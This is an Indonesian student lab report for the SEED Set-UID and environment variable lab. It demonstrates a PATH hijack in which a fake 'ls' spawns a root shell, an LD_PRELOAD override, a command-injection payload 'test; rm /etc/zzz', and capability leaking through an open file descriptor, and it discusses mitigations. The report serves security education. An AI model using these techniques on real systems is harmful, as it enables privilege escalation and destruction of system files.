# R1 – Environment Variable and Set-UID Program

## Tujuan
Tujuan dari praktikum ini adalah untuk memahami bagaimana environment variable mempengaruhi perilaku program, khususnya pada program Set-UID. Lab ini mencakup topik-topik: environment variables, Set-UID programs, secure invocation of external programs, capability leaking, dan dynamic loader/linker.

## Environment
* **OS:** SEED Ubuntu 20.04
* **Tools:** `gcc`, `bash`, `chmod`, `chown`, `zsh`

---

## Task 1 – Manipulating Environment Variables

### Langkah
1. Gunakan `printenv` atau `env` untuk melihat semua environment variables.
   ```bash
   printenv
   env
   ```
2. Gunakan `printenv PWD` atau `env | grep PWD` untuk melihat environment variable tertentu.
   ```bash
   printenv PWD
   ```
3. Gunakan `export VARIABLENAME=value` untuk menambah environment variable baru.
   ```bash
   export mkn=makan
   printenv mkn
   ```
4. Gunakan `unset VARIABLENAME` untuk menghapus environment variable.
   ```bash
   unset mkn
   printenv mkn
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="2" src="https://github.com/user-attachments/assets/2f055cfe-70c9-40d4-9ef9-33a61cee81dd" />
<img width="1920" height="902" alt="3" src="https://github.com/user-attachments/assets/b7cff3e7-d4df-4753-bb93-889f60913f2a" />


### Analisis
Environment variable dapat dibuat, diubah, dan dihapus oleh user, serta secara otomatis diwariskan ke program yang dijalankan dari shell. Karena sifatnya yang fleksibel dan dikontrol oleh user, environment variable dapat menjadi sumber kerentanan jika digunakan tanpa validasi dalam program.

---

## Task 2 – Passing Environment Variables from Parent Process to Child Process

### Langkah
1. Compile dan jalankan program `myprintenv.c`, simpan output proses child.
   ```bash
   gcc myprintenv.c
   ./a.out > child_output
   ```
2. Modify kode - comment line `printenv();` di child process, uncomment di parent process, lalu compile dan jalankan.
   ```bash
   gcc myprintenv.c
   ./a.out > parent_output
   ```
3. Bandingkan kedua file menggunakan `diff`.
   ```bash
   diff child_output parent_output
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="4" src="https://github.com/user-attachments/assets/e724dbcf-bf57-40a2-b03b-7744e8009a3e" />


### Analisis
Perintah `diff` tidak menampilkan perbedaan apa pun. `fork()` menciptakan child process yang merupakan exact duplicate dari parent, termasuk environment-nya. Child mewarisi copy environment variables yang identik dari parent process.

---

## Task 3 – Environment Variables and execve()

### Langkah
1. Compile program `myexecve.c` di mana parameter ketiga `execve()` bernilai `NULL`.
   ```c
   execve("/usr/bin/env", argv, NULL);
   ```
   Hasilnya tidak akan menampilkan environment variable.

2. Modify program - ganti parameter ketiga `execve()` dari `NULL` menjadi `environ`.
   ```c
   extern char **environ;
   execve("/usr/bin/env", argv, environ);
   ```
3. Compile dan jalankan program yang dimodifikasi.
   ```bash
   gcc myexecve.c
   ./a.out
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="5" src="https://github.com/user-attachments/assets/67046a6c-1752-4e38-a0ac-9acd4f7f61c3" />

### Analisis
Ketika parameter ketiga `execve()` adalah `NULL`, program baru mendapat environment kosong. Environment tidak otomatis diwariskan - harus diberikan secara eksplisit melalui parameter ketiga (`environ`). Ini berbeda dari `fork()` yang otomatis mewarisi environment.

---

## Task 4 – Environment Variables and system()

### Langkah
1. Buat program `mysystem.c` yang memanggil `system("/usr/bin/env")`.
   ```c
   #include <stdio.h>
   #include <stdlib.h>
   int main() {
       system("/usr/bin/env");
       return 0;
   }
   ```
2. Compile dan jalankan program tersebut.
   ```bash
   gcc mysystem.c
   ./a.out
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="6" src="https://github.com/user-attachments/assets/6110bd4e-1f9e-4f1e-a1e6-54537de19ae7" />


### Analisis
`system()` menjalankan `/bin/sh -c command`, di mana shell secara otomatis mewarisi environment dari calling process. Program yang menggunakan `system()` sangat peka terhadap environment variables yang bisa dimanipulasi user, menjadikannya security risk pada program Set-UID.

---

## Task 5 – Environment Variables and Set-UID Programs

### Langkah
1. Buat program `task5.c` yang menge-print semua environment variables menggunakan `extern char environ`.
2. Compile dan set sebagai Set-UID root.
   ```bash
   gcc task5.c -o task5
   sudo chown root task5
   sudo chmod 4755 task5
   ```
3. Set environment variables dari terminal normal user.
   ```bash
   export PATH="$PATH:/newpath"
   export LD_LIBRARY_PATH="/mylib"
   export ANY_NAME="saya"
   ```
4. Jalankan Set-UID program.
   ```bash
   ./task5
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="8" src="https://github.com/user-attachments/assets/217a6d82-233a-496e-8d14-6b120ca4a254" />


### Analisis
Set-UID program tetap mewarisi sebagian besar environment variables dari user shell (seperti `ANY_NAME` dan `PATH`). Namun, sistem operasi (linker `ld.so`) secara otomatis menghapus environment variables yang berbahaya seperti `LD_LIBRARY_PATH` saat mendeteksi program berjalan dengan privilege Set-UID. Hal ini untuk mencegah serangan shared library injection.

---

## Task 6 – The PATH Environment Variable and Set-UID Programs

### Langkah
1. Buat Set-UID program (`task6.c`) yang menggunakan `system("ls")` (relative command name).
2. Compile dan set sebagai Set-UID root.
   ```bash
   gcc task6.c -o task6
   sudo chown root task6
   sudo chmod 4755 task6
   ```
3. Buat malicious `ls.c` di direktori buatan (misal `hayo`) yang mengeksekusi shell.
   ```c
   #include <stdio.h>
   #include <stdlib.h>
   int main() {
       printf("Malicious ls executed with root privilege!\n");
       system("/bin/sh");
       return 0;
   }
   ```
4. Compile malicious executable.
   ```bash
   mkdir hayo
   gcc hayo/ls.c -o hayo/ls
   ```
5. Manipulasi PATH, matikan proteksi dash (ganti ke zsh), dan jalankan Set-UID program.
   ```bash
   export PATH="$HOME/hayo:$PATH"
   sudo ln -sf /bin/zsh /bin/sh
   ./task6
   ```

### Dokumentasi Output
<img width="1920" height="898" alt="10" src="https://github.com/user-attachments/assets/627a3aec-fc48-44e2-af29-bf3dcc3a77da" />


### Analisis
Karena `system()` menggunakan shell yang mencari command via urutan `PATH`, program Set-UID yang menggunakan relative command names (seperti `ls`) dapat dimanipulasi. Attacker bisa membuat malicious executable di direktori dengan prioritas `PATH` tertinggi untuk mendapatkan root shell. Mitigasinya adalah selalu gunakan absolute paths (misal `/bin/ls`) di dalam privileged programs.

---

## Task 7 – The LD_PRELOAD Environment Variable and Set-UID Programs

### Langkah
1. Buat library (`mylib.c`) yang mengganti fungsi `sleep()`.
   ```c
   #include <stdio.h>
   void sleep(int s) {
       printf("I am not sleeping!\n");
   }
   ```
2. Compile library menjadi shared object.
   ```bash
   gcc -fPIC -g -c mylib.c
   gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
   ```
3. Buat program `task7.c` yang memanggil `sleep(1);`.
   ```bash
   gcc task7.c -o task7
   ```
4. Set `LD_PRELOAD` dan jalankan program.
   ```bash
   export LD_PRELOAD=./libmylib.so.1.0.1
   ./task7
   ```

### Dokumentasi Output
<img width="1920" height="898" alt="11" src="https://github.com/user-attachments/assets/ee07adf9-c7d7-49f5-9cff-7759bc72bca4" />


### Analisis
Pada program biasa, `LD_PRELOAD` berhasil membajak dynamic loader dan mengganti `sleep()` bawaan dengan fungsi buatan kita (mencetak "I am not sleeping!" tanpa jeda). Namun, jika program tersebut di-set menjadi Set-UID root, OS otomatis akan mengabaikan `LD_PRELOAD` dari normal user untuk mencegah eksekusi kode berbahaya pada proses ber-privilege tinggi.

---

## Task 8 – Invoking External Programs Using system() versus execve()

### Langkah
1. Siapkan file target yang tidak boleh dihapus sembarangan.
   ```bash
   sudo touch /etc/zzz
   sudo chmod 644 /etc/zzz
   ```
2. Compile program (`task8.c`) menggunakan versi `system(command)` lalu set sebagai Set-UID root.
   ```bash
   gcc task8.c -o task8_system
   sudo chown root task8_system
   sudo chmod 4755 task8_system
   ```
3. Jalankan command injection payload.
   ```bash
   ./task8_system "test; rm /etc/zzz"
   ```
4. Ganti implementasi di dalam kode C dari `system()` menjadi `execve()`, compile menjadi `task8_execve`, dan eksekusi payload yang sama.
   ```bash
   ./task8_execve "test; rm /etc/zzz"
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="12" src="https://github.com/user-attachments/assets/64279950-18a0-47bc-b9c4-c0dc51cd43c0" />


### Analisis
Fungsi `system()` memanggil shell `/bin/sh` yang menafsirkan karakter pemisah `;`. Akibatnya, input `"test; rm /etc/zzz"` memicu command injection yang menghapus file sistem secara permanen. Sebaliknya, `execve()` memproses string tersebut murni sebagai satu nama argumen utuh tanpa intervensi shell parser, sehingga eksploitasi gagal dan file `/etc/zzz` tetap aman.

---

## Task 9 – Capability Leaking

### Langkah
1. Buat file `/etc/zzz` dengan permission hanya root yang bisa modifikasi.
   ```bash
   sudo touch /etc/zzz
   sudo chmod 644 /etc/zzz
   ```
2. Compile `task9.c` dan set sebagai Set-UID program.
   ```bash
   gcc task9.c -o task9
   sudo chown root task9
   sudo chmod 4755 task9
   ```
3. Jalankan program. Program akan membuka file sebagai root, mencetak File Descriptor (`fd is 3`), menurunkan hak akses menjadi user biasa, lalu mengeksekusi `/bin/sh`.
   ```bash
   ./task9
   ```
4. Di dalam shell yang baru terbuka, eksploitasi File Descriptor (`fd 3`) yang lupa ditutup dengan menyuntikkan teks.
   ```bash
   echo "hack" >&3
   exit
   ```
5. Periksa isi `/etc/zzz`.
   ```bash
   cat /etc/zzz
   ```

### Dokumentasi Output
<img width="1920" height="902" alt="1" src="https://github.com/user-attachments/assets/8adc8a01-5a6d-4425-b56e-30f061fc8725" />


### Analisis
Pada percobaan ini, program berhasil dieksploitasi dan teks `"hack"` tertulis ke dalam `/etc/zzz`. Hal ini menunjukkan fenomena **Capability Leaking**. Walaupun program Set-UID root sudah menurunkan hak aksesnya menjadi normal user sebelum mengeksekusi shell baru, file descriptor (jalur akses file) yang terbuka saat berstatus root belum ditutup. Akibatnya, shell anak (child shell) mewarisi file descriptor tersebut dan mengizinkan user biasa menulis ke file sistem yang dilindungi.

---

## Kesimpulan Umum
Lab ini memperlihatkan berbagai vektor kerentanan pada program Set-UID yang berkaitan dengan environment variable, eksekusi program eksternal, dan manajemen file descriptor. Kesimpulan utama:

1. **Environment variable** dapat dimanipulasi oleh user biasa dan berpotensi memengaruhi jalannya program privileged.

2. **Fungsi `system()`** sangat berbahaya jika dibandingkan dengan `execve()` karena melibatkan shell yang peka terhadap modifikasi environment dan command injection (metakarakter).

3. **Variabel `PATH`** dan mekanisme **`LD_PRELOAD`** merupakan vektor serangan kritis; sehingga linker/OS membatasi hal ini pada Set-UID, namun developer tetap harus waspada (contohnya menggunakan absolute path).

4. **Capability Leaking** sangat berbahaya: File descriptor yang dibuka saat memiliki privilege tinggi harus segera ditutup (`close(fd)` atau menggunakan `O_CLOEXEC`) sebelum privilege tersebut diturunkan kembali ke user biasa.
